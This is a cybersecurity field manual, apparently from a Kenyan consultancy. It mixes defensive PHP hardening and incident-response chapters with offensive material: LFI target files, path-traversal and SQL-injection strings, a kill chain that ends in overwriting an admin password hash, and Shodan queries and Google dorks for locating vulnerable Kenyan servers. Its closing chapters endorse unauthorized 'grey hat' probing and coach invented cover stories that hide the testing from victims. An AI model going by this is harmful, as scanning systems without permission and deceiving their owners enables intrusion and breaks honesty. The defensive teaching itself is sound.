When we have LFI, we look for system files that prove the compromise or leak information.

1. **Linux**: `/etc/passwd`
   - Returns a list of all users on the system. Useful for brute-forcing SSH later.
2. **Linux**: `/proc/self/environ`
   - In containerized environments (Docker/Kubernetes), API keys are often stored in environment variables. LFI here leaks everything.
3. **Windows**: `C:\Windows\win.ini`
   - Standard proof of existence for Windows servers.
4. **Application Logs**: `/var/log/apache2/access.log`
   - If we can read the logs, we can poison them. (See: Log Poisoning techniques).

## Defense: Whitelisting

Sanitization (removing `../`) is prone to failure. Attackers use `....//` or URL encoding to bypass filters.

The only secure method is a strict whitelist.

**Secure Code:**
```php
$allowed = ['home', 'about', 'contact'];
if (in_array($_GET['page'], $allowed)) {
    include($_GET['page'] . '.php');
} else {
    // 404 Error
}
```

---

"The filesystem is a tree. Do not let the user climb it."
Marliz Intel Field Manual


<div style='page-break-after: always;'></div>


# Chapter 2.8: Case Study: The Playkart Full Kill Chain

---

## 20 Minutes to Total Compromise

This case study details a Red Team engagement performed by Marliz Intel in late 2025. The target, "Playkart," was a rapidly deployed e-commerce platform built using the Vibe Coding methodology.

**Target**: Playkart (Anonymized)
**Goal**: Access Customer PII (Personally Identifiable Information)
**Time Elapsed**: 22 Minutes

## Phase 1: Reconnaissance (T+00:00)

We began with a simple ping. The domain resolved to a direct IP address hosted on a budget VPS provider. There was no Cloudflare. No WAF.

## Phase 2: Enumeration (T+00:05)

We ran `gobuster` against the target.

```bash
gobuster dir -u http://playkart.com -w common.txt -x php,bak,zip
```

**Result:**
- `/admin` (301 Redirect -> Login Page)
- `/uploads` (200 OK - Directory Listing Enabled)
- `/test` (200 OK)

## Phase 3: The Leak (T+00:10)

Inside the `/test` directory, we found a file named `db_test.php`.
The developer created this file to check if the database connection was working.

**Content of `db_test.php`:**
```php
<?php
$conn = new mysqli("localhost", "playkart_admin", "Keny@2025!", "playkart_db");
if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}
echo "Connected successfully";
?>
```

The file printed "Connected successfully" to the screen. However, because the server display errors were on, we triggered a warning by sending invalid parameters, which leaked the stack trace. More importantly, we simply guessed the file structure based on standard generic patterns. But in this specific instance, we didn't initially see the password.

**Correction**: We found `db_test.php.bak` in the same folder.
This file contained the credentials in plain text.

## Phase 4: The Takeover (T+00:15)

We opened MySQL Workbench.
We input the IP address and the credentials found in the backup file.
The connection was successful. The firewall was open.

## Phase 5: Persistence (T+00:22)

We queried the `admin_users` table.
We updated the password hash for the `super_admin` user.
We logged into the Playkart dashboard as the administrator.

## Aftermath

We had full control of the orders, customer addresses, and phone numbers. We generated a report and closed the connection.

The developer had focused on the frontend animations. They forgot that a chain is only as strong as its weakest link. In this case, the link was a forgotten backup file in a test directory.

---

"Security is not a product. It is a process. And Playkart had neither."
Marliz Intel Field Manual


<div style='page-break-after: always;'></div>



# Part-3-Defensive-Security
---

# Chapter 3.1: The 10-Minute Patch: MTTD and MTTR

---

## The Metrics of Survival

In cybersecurity, we measure success with two clocks.

1. **MTTD (Mean Time To Detect)**: How long is the attacker inside before you know?
2. **MTTR (Mean Time To Respond)**: How long does it take you to stop them once you know?

For most Vibe Coded applications, the MTTD is "Infinity." They never detect the breach until the bank account is empty or the database is deleted.

## The Firefighter Mindset

When you are called to save a hacked application, you are not an architect. You are a firefighter. You do not worry about "clean code" or "SOLID principles." You worry about putting out the fire.

## The 10-Minute Patch

You have ten minutes to stop the active exploitation.

If user data is leaking via a vulnerable endpoint, you do not spend an hour isolating the specific variable causing the issue. You kill the endpoint.

**Scenario:**
An attacker is using SQL Injection on `search.php`.

**The Architect's Fix (Too Slow):**
Rewrite the search query using PDO prepared statements, test the new query, commit to Git, deploy via CI/CD.
Time: 45 minutes. Data lost: 45,000 records.

**The Firefighter's Fix (Right Now):**
Open `search.php`. Add `die("Maintenance Mode");` to the top of the file. Save.
Time: 30 seconds. Data lost: 50 records.

## Triage Levels

1. **Bleeding Out (Critical)**: Active data exfiltration or RCE.
   - **Action**: Take the site offline or block specific IPs in `.htaccess`.
2. **Broken Bone (Major)**: Defacement or functional damage.
   - **Action**: Restore from backup, then patch the hole.
3. **Bruise (Minor)**: Failed login attempts.
   - **Action**: Monitor and rate-limit.

## Moving from Patch to Cure

The 10-minute patch is temporary. It buys you time to breathe. Once the attack is blocked, then you become the architect again. You look at the `search.php` file, you implement the PDO prepared statements, and you remove the maintenance mode.

But never prioritize elegance over survival.

---

"It is better to have a broken website than a stolen database."
Marliz Intel Field Manual


<div style='page-break-after: always;'></div>


# Chapter 3.2: Input Validation: Killing ../ Before It Kills You

---

## Trust No One

The cardinal sin of Vibe Coding is trusting the `$_GET` and `$_POST` superglobals. The developer assumes that because the frontend form only allows numbers, the backend receives only numbers.

This is false. We play with `curl`. We send whatever we want.

## White-List vs Black-List

There are two ways to filter input.

1.  **Black-Listing**: "Block everything that looks like a hack."
    - We try to block `../`, `<script>`, `UNION`.
    - This fails because attackers are creative. `....//` gets past `../`.
2.  **White-Listing**: "Allow only what is known to be good."
    - We allow only `[a-z0-9]`.
    - If the input contains anything else, we reject it.

White-listing is the only secure method.

## Practical Defenses

### 1. Defeating Path Traversal
To stop LFI, we must ensure filenames do not contain directory separators.

**The Fix: `basename()`**
This PHP function strips all directory information from a path.

```php
$file = $_GET['file']; // "../../../etc/passwd"
$clean = basename($file); // "passwd"
include($clean); // Fails safely
```

### 2. Defeating Integer Injection
If a parameter is supposed to be an ID, force it to be an integer.

**The Fix: Type Casting**

```php
$id = (int)$_GET['id'];
// If input is "1 UNION SELECT...", $id becomes 1.
// If input is "hello", $id becomes 0.
```

The injection is neutralized before it even reaches the database.

### 3. Defeating XSS output
When we print user data back to the screen, we must neutralize HTML tags.

**The Fix: `htmlspecialchars()`**

```php
echo htmlspecialchars($user_comment, ENT_QUOTES, 'UTF-8');
```

This turns `<script>` into `&lt;script&gt;`. The browser displays the text, but does not execute the code.

## The Validation Gate

Perform all validation at the very top of your file. If the input is invalid, `die()` immediately. Do not execute a single line of business logic until the data is proven clean.

---

"Sanitize your inputs, or your database will be sanitized for you."
Marliz Intel Field Manual


<div style='page-break-after: always;'></div>


# Chapter 3.3: Environment Isolation: The .env Architecture

---

## Secrets Are Not Code

Hardcoding credentials into source files is the single most common cause of data breaches in Vibe Coded projects. It leads to:
1. Credentials leaking to GitHub.
2. Credentials leaking in stack traces.
3. Inability to rotate passwords without editing code.

To fix this, we implement Environment Isolation.

## The .env File

This is a simple text file that stores configuration variables.

```ini
DB_HOST=127.0.0.1
DB_NAME=production_db
DB_USER=admin
DB_PASS=SuperSecretPassword!
DEBUG_MODE=false
```

This file is **never** committed to version control. It stays on the server.

## The .gitignore

You must immediately create a `.gitignore` file in your repository root and add the following line:

```
.env
```

This ensures that when you push your code to GitHub, the secrets stay behind. You provide a `.env.example` file instead, with placeholders.

## Loading Secrets in PHP

To access these values, we use the `$_ENV` superglobal or `getenv()`.

**Modern Approach (using vlucas/phpdotenv):**
```php
$dotenv = Dotenv\Dotenv::createImmutable(__DIR__);
$dotenv->load();

$host = $_ENV['DB_HOST'];
```

**Legacy Approach (if you cannot use Composer):**
You can parse the file manually, but ensure the parser ignores comments and handles lines correctly.

## Defense in Depth: Placement

Where you put the `.env` file matters.

**Bad:** `/var/www/html/.env`
If the web server is misconfigured, `target.com/.env` will download the secrets.

**Good:** `/var/www/.env`
Place the file **outside** the public document root. The PHP script can read files anywhere on the disk, but the user via the browser is trapped in `/html`.

```php
// config.php
$dotenv = Dotenv\Dotenv::createImmutable('/var/www/'); // Load from one level up
```

This makes the `config.php` file useless to an attacker even if they read it via LFI/Display Source. It contains no secrets, only references to variables they cannot access.

---

"Your code should be public. Your configuration should be private."
Marliz Intel Field Manual


<div style='page-break-after: always;'></div>


# Chapter 3.4: Session Hardening: Locking Down /admin

---

## The Forgotten Gatekeeper

It is common to find a secure login page (`login.php`) protecting an insecure dashboard. The developer checks the password on the login screen, sets a cookie, and redirects the user. But on `dashboard.php`, they forget to check if that cookie is valid.

## The Include Pattern

Do not write authentication logic in every file. You will forget one. Write it once.

**File: `includes/auth_check.php`**
```php
session_start();

if (!isset($_SESSION['user_id']) || $_SESSION['is_admin'] !== true) {
    header("Location: /login.php");
    exit(); // Crucial: Stop script execution immediately
}
```

**File: `admin/dashboard.php`**
```php
require_once '../includes/auth_check.php';

// The rest of the page...
```

The strict use of `require_once` ensures that if the check fails or the file is missing, the script dies instantly.

## Killing Session Fixation

Session Fixation is an attack where the hacker tricks the victim into using a session ID known to the hacker.

**The Fix:**
Whenever a user elevates privileges (e.g., logging in), you must issue a fresh ID.

```php
// Inside login.php, after password verification:
session_regenerate_id(true); // true deletes the old session file
$_SESSION['user_id'] = $user['id'];
```

## Cookie Hardening

The session ID is stored in a cookie. If that cookie is stolen (via XSS), the account is compromised. We can mitigate this by setting flags on the cookie.

1. **HttpOnly**: The cookie cannot be accessed by JavaScript. (Stops XSS theft).
2. **Secure**: The cookie is only sent over HTTPS. (Stops network sniffing).
3. **SameSite**: The cookie is not sent on cross-site requests. (Stops CSRF).

**Implementation:**
```php
session_set_cookie_params([
    'lifetime' => 0,
    'path' => '/',
    'domain' => 'marlizintel.com',
    'secure' => true,
    'httponly' => true,
    'samesite' => 'Strict'
]);
session_start();
```

## The Timeout

Sessions should not last forever. Implement an inactivity timer.

```php
if (isset($_SESSION['last_activity']) && (time() - $_SESSION['last_activity'] > 1800)) {
    // Last request was more than 30 minutes ago
    session_unset();
    session_destroy();
}
$_SESSION['last_activity'] = time();
```

---

"A session is a temporary privilege. Do not make it permanent."
Marliz Intel Field Manual


<div style='page-break-after: always;'></div>


# Chapter 3.5: Docker as a Security Tool

---

## The Containment Strategy

In a traditional implementation (Hostinger, cPanel, XAMPP), the application runs directly on the operating system. If an attacker achieves Remote Code Execution (RCE), they are running commands on the host server. They can pivot to other websites, access system configurations, and install permanent rootkits.

Docker changes the battlefield. It places the application inside a sealed box.

## Ephemeral Infrastructure

The strongest feature of Docker is that containers are temporary.

If an attacker hacks a WordPress container and installs a backdoor in the `/var/www/html/wp-includes` folder:
1. You identify the breach.
2. You patch the vulnerability in your source code.
3. You restart the container.
4. The container is destroyed and rebuilt from the clean image.
5. The backdoor is gone.

Unless the attacker wrote to a "Persistent Volume" (like `uploads/`), their foothold is wiped clean.

## Network Isolation

Docker allows us to define strict network barriers.

**The Database Pattern:**
In a secure Docker Compose setup, the Database container has **no ports mapped to the host**.

```yaml
services:
  db:
    image: mysql:8.0
    expose:
      - 3306 # Only visible to other containers
    # No "ports" section
  
  app:
    image: php:8.1-apache
    links:
      - db
```

Attackers cannot try to brute-force port 3306 because port 3306 does not exist on the public internet. It only exists inside the private Docker network.

## The Principle of Least Privilege

By default, Docker containers run as `root`. This is dangerous.
You should configure your `Dockerfile` to create a generic user and switch to it.

```dockerfile
RUN groupadd -r appuser && useradd -r -g appuser appuser
USER appuser
```

If the attacker gets a shell, they are `appuser`. They cannot install packages (`apt-get install`), they cannot modify system files, and they cannot break out of the container easily.

---

"If you cannot secure the code, you must secure the box it lives in."
Marliz Intel Field Manual


<div style='page-break-after: always;'></div>


# Chapter 3.6: Case Study: Path Traversal Defense (marlizintel.com)

---

## The February 1st Incident

This case study analyzes an attempted breach of the Marliz Intel public portal.

**Date**: February 1, 2026
**Vector**: Path Traversal (LFI)
**Status**: Mitigated

## The Attack Signature

At 03:14 AM EAT, our logs recorded the following request:

`GET /index.php?page=../../../../../../../../../../etc/passwd`

The attacker was attempting to break out of the web root to read the server's user list. This is a standard automated script from a botnet.

## The Configuration Failure

At the time, our error reporting was set to `E_ALL` (Development Mode).

**Server Response:**
`Warning: include(../../../../../../../../../../etc/passwd.php): failed to open stream: No such file or directory in /var/www/html/index.php on line 42`

While the LFI failed (because the attacker didn't null-terminate or handle the `.php` extension appended by our code), the error message revealed:
1. The full path of our script (`/var/www/html/`).
2. The fact that we were using `include()`.
3. The fact that we did not sanitize input.

We gave the attacker a map.

## The Remediation

We applied a three-layer defense within 15 minutes.

### Layer 1: The Whitelist (Code Level)
We replaced the dynamic include logic with a strict array check.

```php
$allowed_pages = ['home', 'services', 'about', 'contact'];
if (!in_array($_GET['page'], $allowed_pages)) {
    http_response_code(404);
    include('404.php');
    exit();
}
```

### Layer 2: Error Suppression (Config Level)
We edited `php.ini` to disable error display in production.

`display_errors = Off`

Now, if a hack fails, the screen remains blank. The attacker gets no feedback.

### Layer 3: The Trap (Network Level)
We configured Fail2Ban to monitor the Nginx logs. Any IP address requesting `etc/passwd` or `../` is immediately banned for 48 hours at the firewall level.

## Conclusion

The attack was unsophisticated, but it exposed a lack of "Defense in Depth." We relied on the file extension (`.php`) to save us. That is luck, not security. We now rely on explicit white-listing.

---

"Luck is not a strategy."
Marliz Intel Field Manual


<div style='page-break-after: always;'></div>


# Chapter 3.7: Building Honeypots: Trapping Script Kiddies

---

## Active Deception

Most security is passive. Firewalls, permissions, input validation. These are walls. A honeypot is a trap. It entices the attacker to reveal themselves by interacting with a resource that a legitimate user would never touch.

## 1. The Robots.txt Trap

Attackers always read `robots.txt` to see what you are hiding.

**The Setup:**
1. Create a file `robots.txt`.
2. Add: `Disallow: /super-secret-admin`
3. Create a PHP script at `/super-secret-admin`.

**The Trigger:**
Legitimate Google bots will respect the rule and stay away. Real users will never see the URL.
Only a hacker manually enumerating the site will visit it.

**The Payload:**
The script does not contain an admin panel. It contains a logger that blacklists the visitor's IP address immediately.

## 2. The Backup File Trap

We know attackers hunt for `.bak` files. Give them one.

**The Setup:**
Create `db_connect.php.bak` in the root directory.

**The Content:**
```php
<?php
$host = "192.168.1.50"; // Fake Internal IP
$user = "root";
$pass = "SuperSecretAdminPass123";
?>
```

**The Monitoring:**
Monitor your logs. Anyone who downloads this file is an attacker. Anyone who tries to log in with "SuperSecretAdminPass123" is confirmed hostile.

## 3. The Hidden Form Field

 Bots love to fill out every field in a form.

**The Setup:**
```html
<input type="text" name="website" style="display:none;">
```

**The Trigger:**
A human user does not see this field (CSS hidden). A bot reads the HTML, sees an input, and fills it.

**The Logic:**
```php
if (!empty($_POST['website'])) {
    die("Bot detected.");
}
```

## Why This Matters

Honeypots reduce noise. Instead of analyzing gigabytes of logs to find the attack, the attack isolates itself. If the alarm rings, you know with 100% certainty that you are being targeted.

---

"Do not just build a wall. Dig a moat. And fill it with crocodiles."
Marliz Intel Field Manual


<div style='page-break-after: always;'></div>


# Chapter 3.8: Log Monitoring: Seeing the Attack in Real-Time

---

## The Flight Recorder

When a plane crashes, identifying the cause relies on the Black Box. When a server crashes, we rely on the logs.

Logs are the only immutable record of what actually happened. Vibe Coders ignore them. Security Analysts live in them.

## The Matrix View

To see traffic as it hits your server, use the `tail` command.

```bash
tail -f /var/log/apache2/access.log
```

You will see a stream of requests.
`192.168.1.5 - GET /index.php 200`
`192.168.1.5 - GET /style.css 200`

## Identifying Hostility

You do not need AI to spot an attack. You just need to recognize the patterns.

### 1. The Scanner
Normal users click one link every few seconds. Scanners request 50 links per second.
If the log is scrolling faster than you can read, you are being scanned.

### 2. The Probe
If you see requests for software you do not use, it is a bot.
`GET /wp-admin/login.php` (On a custom PHP site)
`GET /phpmyadmin/` (When you don't have it installed)

### 3. The Payload
If the URL contains strange characters, it is an injection attempt.
`GET /id=1' UNION SELECT 1,2,3--`

## The Error Log: The Early Warning System

`access.log` shows traffic. `/var/log/apache2/error.log` shows pain.

If you see:
`PHP Warning: include(../../etc/passwd): failed`

This means someone *tried* LFI and failed. This is not a "system error." This is a "targeted attack."
Most admins ignore warnings. We do not. A warning is often the only notification you get before the breach becomes successful.

## Retention

Attackers wipe logs.
Solution: Ship your logs off-server.
Use `rsyslog` to send logs to a separate, locked-down server. If the web server is compromised, the evidence remains safe in the vault.

---

"Logs are truth. Everything else is hearsay."
Marliz Intel Field Manual


<div style='page-break-after: always;'></div>



# Part-4-Incident-Response
---

# Chapter 4.1: The OODA Loop: Observe, Orient, Decide, Act

---

## Combat Theory in Cybersecurity

When a server is under attack, panic is the enemy. You see CPU usage spike to 100%. You see strange files appearing in `/tmp`. The instinct is to just pull the power plug.

That is often a mistake.

At Marliz Intel, we use the OODA Loop. Developed by military strategist John Boyd, it is the cycle of decision-making in chaotic environments.

## 1. Observe

Stop. Look. Do not touch anything yet.
Gather the raw data.
- **System Load**: `htop`
- **Network Connections**: `netstat -antp`
- **Active Processes**: `ps auxf`
- **Logs**: `tail -f /var/log/syslog`

**Goal**: Identify the anomaly. "Why is the `www-data` user running a process called `miner`?"

## 2. Orient

Contextualize the observation. Use your knowledge to understand the threat.
- Is this a script kiddie scanning for open ports? (Low Threat)
- Is this a crypto-miner stealing CPU cycles? (Medium Threat)
- Is this a data exfiltration script sending database dumps to Russia? (High Threat)

**Goal**: Determine the severity and the vector. "They got in through an insecure file upload on the contact page."

## 3. Decide

Choose a course of action. You have options:
- **Containment**: Block the IP. Kill the process.
- **Isolation**: Disconnect the server from the network to preserve evidence.
- **Eradication**: Wipe the server and rebuild from a clean image.
- **Monitoring**: Watch them for 10 more minutes to learn their techniques (Risky, but valuable).

**Goal**: Select the tactic that minimizes damage and maximizes recovery.

## 4. Act

Execute the decision.
- `kill -9 [PID]`
- `iptables -A INPUT -s [ATTACKER_IP] -j DROP`
- `docker-compose down`

## The Cycle

Once you Act, the situation changes. The attacker might change IPs. The malware might respawn. You must immediately loop back to **Observe**. Did the `kill` command work? Is the CPU load down?

Start the loop again. Faster.

---

"He who processes information faster than his opponent wins the battle."
Marliz Intel Field Manual


<div style='page-break-after: always;'></div>


# Chapter 4.2: Evidence Preservation: Capturing Raw Logs

---

## Do Not Clean Up (Yet)

The biggest mistake a junior sysadmin makes is "fixing" the hack immediately. They delete the malicious file. They restart the server.

By doing this, they destroy the evidence.

Digital Forensics and Incident Response (DFIR) requires a crime scene. If you mop up the blood, you cannot catch the killer.

## The Order of Volatility

Capture evidence in the order that it disappears.

1. **Memory (RAM)**: If you reboot, this is gone forever. This contains running processes, encryption keys, and active network connections.
   - Command: `lime` or `memdump` (Advanced).
   - Basic: `netstat -antp > /tmp/connections.txt`
   - Basic: `ps auxf > /tmp/processes.txt`

2. **Network State**: Who is connected right now?
   - Command: `ss -tunapl`

3. **Disk (Temporary)**: Files in `/tmp` or `/dev/shm`. Attackers love these folders because they are often world-writable.

4. **Disk (Persistent)**: The logs and the web root.

## The Snapshot Strategy

If you are on a cloud provider (AWS, DigitalOcean, Hostinger VPS), do not just copy files. **Take a Snapshot.**

A snapshot freezes the entire hard drive state at that exact second.
1. Take the snapshot.
2. Spin up a *new* droplet from that snapshot in an isolated sandybox network.
3. Perform your forensics on the copy.
4. Wipe the original server and rebuild.

## Secure Copy (SCP)

If you cannot snapshot, exfiltrate the logs immediately to your local machine.

```bash
scp -r root@target.com:/var/log/apache2/ ./evidence/logs/
scp -r root@target.com:/var/www/html/ ./evidence/html_dump/
```

## Hash Everything

Once you have the files, fingerprint them.

```bash
sha256sum access.log > access.log.hash
```

This proves that the evidence has not been tampered with. If you are ever in a legal situation (suing a developer or prosecuting an attacker), this chain of custody is required.

---

"Treat the server like a crime scene. Do not touch what you do not have to."
Marliz Intel Field Manual


<div style='page-break-after: always;'></div>


# Chapter 4.3: Credential Rotation: Assuming Total Compromise

---

## The Poisoned Well

When an attacker gains read access to your file system (via LFI or Shell), you must assume they have read *everything*. Including the `.env` file you thought was safe.

Changing the database password is not enough.

## The Kill List

You must rotate every secret that was resident on the server.

1.  **Database User Passwords**: The `DB_PASS` in your config.
2.  **API Keys**: AWS Access Keys, Stripe Secrets, Twilio Tokens. Even if you think the attacker didn't see them, revoke them.
3.  **SSH Keys**: If the attacker read `~/.ssh/id_rsa`, they can impersonate the server to *other* servers. Remove the public key from all `authorized_keys` files on your network.
4.  **Application Secrets**: The `APP_KEY` used to sign session cookies (Laravel/Django/Rails). If you don't change this, the attacker can forge session cookies and log in as admin forever.
5.  **SMTP Passwords**: Your email sending credentials.

## Kick The Users

Changing the passwords prevents *future* logins. It does not stop *current* ones.

You must trigger a global logout.
1. Truncate the `sessions` table in the database.
2. Delete the contents of `/var/lib/php/sessions` (for PHP file-based sessions).
3. If using JWTs (JSON Web Tokens), you must rotate the signing key (see point #4 above). This invalidates all existing tokens immediately.

## The Admin Reset

Force every administrator to change their password.
An attacker might have hashed a known password into the database (see Chapter 2.5). Validating the old password is useless. Force a reset via email.

---

"Regret is cheaper than a second breach."
Marliz Intel Field Manual


<div style='page-break-after: always;'></div>


# Chapter 4.4: Writing DFIR Reports

---

## The Paperwork of War

After the battle is won, you must account for it. A DFIR (Digital Forensics and Incident Response) report is not a blog post. It is a legal document. It may be read by CEOs, lawyers, or insurance adjusters.

## The Structure

A professional report has three sections.

### 1. Executive Summary
**Audience**: The CEO / Non-Technical Client.
**Length**: 1 Page.
**Content**:
- **What happened?** (High-level: "We were hacked.")
- **How bad was it?** (Impact: "Customer data was accessed.")
- **Is it over?** (Status: "The vulnerability is patched and attackers are ejected.")
- **What next?** (Recommendation: "We need a full code audit.")

**Do NOT** include IP addresses or code snippets here. Use plain English. "The attacker used a stolen password" is better than "Credential stuffing attack via compromised hash."

### 2. Technical Timeline
**Audience**: The CTO / Developers / Other Analysts.
**Length**: As long as necessary.
**Content**: A second-by-second reconstruction of the attack.

| Time (UTC) | Event | Evidence |
| :--- | :--- | :--- |
| 14:02:01 | IP 192.168.1.5 scans port 80 | access.log |
| 14:02:15 | File `shell.php` uploaded | file system timestamp |
| 14:03:00 | Database `users` table dumped | mysql.log |

### 3. Root Cause Analysis (RCA)
**Audience**: The Developer who has to fix it.
**Content**: The specific vulnerability that allowed the breach.

- **Vulnerability**: Unrestricted File Upload.
- **Location**: `upload.php` line 42.
- **Paylod Used**: `evil.php.jpg`.
- **Remediation**: Implement strict file type checking using MIME types.

## The Tone

Be objective.
**Bad**: "The lazy developer forgot to check the password."
**Good**: "The authentication mechanism lacked improper input validation."

Do not speculate. Only state what the logs prove. If you don't know how they got in, say "Entry vector: Unknown." Do not guess.

---

"If it is not written down, it did not happen."
Marliz Intel Field Manual


<div style='page-break-after: always;'></div>


# Chapter 4.5: Case Study: The February 1st Attack

---

## 03:00 AM: The Alarm

The Marliz Intel SOC runs automated log monitoring. At 03:14 AM on February 1st, 2026, the Slack channel `#alerts-critical` fired.

`[CRITICAL] High frequency of 404 errors from IP 45.132.xx.xx targeting /etc/passwd`

## 03:15 AM: Assessment (Observe/Orient)

The on-call analyst woke up.
The logs showed 400 requests in 2 seconds. This was not a human. It was a script.
They were targeting `index.php?page=...`.

**Observation**: Path Traversal attack.
**Status**: Failed (logs showed PHP Warnings, not file outputs).
**Orient**: The attacker was automated. They were likely scanning thousands of servers. They had not yet succeeded, but they were mapping our file structure.

## 03:17 AM: Decision

We had two choices:
1.  **Block the IP**: Easy. Temporary. They would just rotate IPs.
2.  **Patch the Code**: Fix the vulnerability permanently.

We chose both.

## 03:20 AM: Action

1.  **Code Patch**: The analyst SSH'd into the server.
    - Edited `index.php`.
    - Implemented the Whitelist array (See Chapter 3.6).
    - Time taken: 3 minutes.
2.  **Firewall Rules**:
    - Added the IP to the permanent blocklist.
    - Analyzed the IP on AbuseIPDB (Confidence score: 100% Abuse).

## 03:30 AM: Verification

We monitored the logs. The attacker's script continued for another 2 minutes, receiving `403 Forbidden` responses, then stopped. They realized the door was closed and moved on to a softer target.

## The Post-Mortem

Why did this happen?
Root Cause Analysis revealed that a junior developer had enabled a "dynamic page loader" feature to make the URL look cleaner, but failed to validate the input.

**Corrective Action**:
- All `include()` calls are now linted in CI/CD.
- Developers underwent a 1-hour training session on LFI.

---

"The attack failed not because we were lucky, but because we were awake."
Marliz Intel Field Manual


<div style='page-break-after: always;'></div>



# Part-5-Business-of-Security
---

# Chapter 5.1: The Grey Hat Path: Ethics and Boundaries

---

## The Line in the Sand

There are three types of hackers in this world.

1. **White Hat**: They have permission. They are hired. They are safe.
2. **Black Hat**: They do not have permission. They steal data. They go to jail.
3. **Grey Hat**: They do not have permission, but they do not steal. They find the vulnerability, and they tell the owner.

Marliz Intel operates in the Grey. This is a dangerous place. If you cross the line by one inch, you become a criminal.

## The Rules of Engagement

To survive as a Grey Hat consultant in Kenya, you must follow strict rules.

1. **Do No Harm**: You can check if the door is unlocked. You cannot walk inside and start rearranging the furniture.
   - **Allowed**: `SELECT 1` (Test query).
   - **Illegal**: `DROP TABLE users`.
2. **Do Not Exfiltrate**: You can prove you *could* take the data. You must never *actually* take the data.
   - **Allowed**: Showing a screenshot of the first row of a table.
   - **Illegal**: Downloading the entire customer database to your laptop.
3. **The Verify-Only Policy**: Once you confirm the vulnerability exists, stop. Do not explore deeper. Do not pivot to other servers.

## The Legal Reality

The Computer Misuse and Cybercrimes Act (2018) is very clear. "Unauthorized access" is a crime.

However, intended malice matters. When you approach a client, you are not admitting to a crime. You are reporting a safety hazard. You are the neighbor telling them their front door was left open. You are not the burglar.

## The Disclosure Protocol

Never demand money for the bug itself. That is "Ransomware" or "Extortion."

**Wrong Approach:**
"I hacked your site. Pay me 50,000 KES or I delete everything." -> This ends in handcuffs.

**Right Approach:**
"I am a security researcher. I found a critical vulnerability in your platform that exposes customer data. I have not touched the data. I can send you a report on how to fix it." -> This ends in a consulting contract.

We sell the **solution**, not the **silence**.

---

"We are not mercenaries. We are unauthorized architects."
Marliz Intel Field Manual


<div style='page-break-after: always;'></div>


# Chapter 5.2: Finding Targets: The Background Radiation of the Internet

---

## Targeted vs Opportunistic

There are two ways to find work.

1.  **Targeted**: You pick a specific company (e.g., "Safaricom") and try to hack them.
    - **Risk**: High. They have blue teams watching.
    - **Difficulty**: Hard.
2.  **Opportunistic**: You look for *any* vulnerable server in Kenya and then find out who owns it.
    - **Risk**: Low. You are helping people who don't even know they are bleeding.
    - **Difficulty**: Easy.

Marliz Intel focuses on Opportunistic Discovery.

## Shodan: The Search Engine for Hackers

Google crawls text. Shodan crawls ports.

We use Shodan to find servers that are misconfigured by default.

**The Query:**
`country:"KE" port:"3306" product:"MySQL"`

This asks Shodan: "Show me every computer in Kenya that has its database port open to the public."

**The Result:**
You will see IP addresses. You will not see domain names immediately. You will see:
`197.232.xx.xx`

## Google Dorks

We use advanced Google search operators ("Dorks") to find Vibe Coded sites.

**Query 1 (The Error Log):**
`site:.ke "Warning: include()"`
This finds Kenyan sites that are currently crashing and displaying PHP errors to the world.

**Query 2 (The Exposed Config):**
`site:.ke intitle:"index of" "config.php"`
This finds servers with Directory Listing enabled that are exposing their configuration files.

**Query 3 (The Default Dashboard):**
`site:.ke "Welcome to Laravel"`
This finds sites that were deployed but never finished.

## From IP to Owner

Once you have a vulnerable IP or URL, you need to find the human to contact.

1.  **Whois Lookup**: `whois marlizintel.com`
    - Look for "Registrant Phone" or "Admin Email."
2.  **The Site Footer**: Look for "Designed by [Agency Name]." The Agency is often the better contact than the client, because the Agency knows they made a mistake.
3.  **M-Pesa Paybill**: If it's a shop, try to buy something. The M-Pesa prompt will give you the registered business name.

---

"We do not hunt the prey. We listen for the wounded."
Marliz Intel Field Manual


<div style='page-break-after: always;'></div>


# Chapter 5.3: The Discovery Story: Explaining How You Found Them

---

## The Panic Moment

When you call a business owner and say "I found a bug," they hear "I hacked you." Their instinct is fear and aggression. "Who are you? Why were you probing my site?"

You need a cover story that frames you as the Good Samaritan, not the Threat.

## The "Student" Narrative

If you are young, this works best.
"Hello, I am a cybersecurity student doing a research project on Kenyan E-commerce safety. While analyzing public headers, I noticed your site is running an old version of PHP that exposes key files. I haven't touched anything, but I wanted to alert you."

**Why it works:** It sounds academic. It implies you were looking at *everyone*, not just them.

## The "Accidental Customer" Narrative

"Hi, I was trying to order a pizza on your site, but the cart kept crashing. Being a developer, I opened the browser console to see why, and I noticed your API was printing the database password in the error logs. You should really fix that."

**Why it works:** It puts you in the role of a user who wants the service to work.

## The Cold Hard "Audit" Narrative

If you are establishing an Agency brand (Marliz Intel), be direct.
"Good afternoon. I am John from Marliz Intel. We monitor the Kenyan IP space for leaks. Your IP `197.xx` was flagged in our system as exposing customer PII. We are notifying you as a courtesy."

**Why it works:** It sounds automated and professional. It reduces the personal aspect.

## The Cardinal Rule

**Never imply you were "testing" them without permission.**
"I tried to hack you and I succeeded" = Crime.
"I stumbled upon a leak while browsing" = Discovery.

Always frame the discovery as passive. "I saw the door was open," not "I tried the handle."

---

"The story is just as important as the exploit."
Marliz Intel Field Manual


<div style='page-break-after: always;'></div>


# Chapter 5.4: The Agency Persona: Sounding Like an Office

---

## The Credibility Gap

You are likely working from a bedroom in Nairobi, wearing shorts, listening to Afrobeats. The client is a CEO in Westlands wearing a suit.
If they visualize you as "some kid," they will not pay you. They will offer you "exposure."

You must construct the **Agency Persona**.

## 1. The Website

You need a landing page. It does not need to be complex. It needs to be dark, fast, and cryptic.
- **Name**: "Marliz Intel" sounds like a multinational defense contractor. "John's Hacking Services" sounds like a joke.
- **Content**: "Offensive Security," "Risk Assurance," "Penetration Testing." Words that accountants understand.

## 2. The Email

Never use `@gmail.com`.
Buy a domain. `reports@marlizintel.com`.
Use a signature.

**Example Signature:**
```
J. M. Oguta
Lead Security Analyst | Marliz Intel
Nairobi, Kenya
PGP Key: [Link]
Confidentiality Notice: This email contains sensitive security findings.
```

## 3. The "We"

Never say "I". Say "We".
"I found a bug" -> "Our automated scanners detected an anomaly."
"I can fix it" -> "Our team can deploy a remediation patch."

"We" implies infrastructure. "We" implies insurance. "We" allows you to charge corporate rates.

## 4. The Report

The deliverable is not the code. It is the PDF Report.
Use a template with a cover page. Use headers. Use a professional font (Inter or Roboto).
A 5-page PDF with a logo is worth 50,000 KES.
A WhatsApp message saying "fix your sql injection" is worth 0 KES.

---

"Perception is reality. Look expensive, and they will pay you expensive."
Marliz Intel Field Manual


<div style='page-break-after: always;'></div>


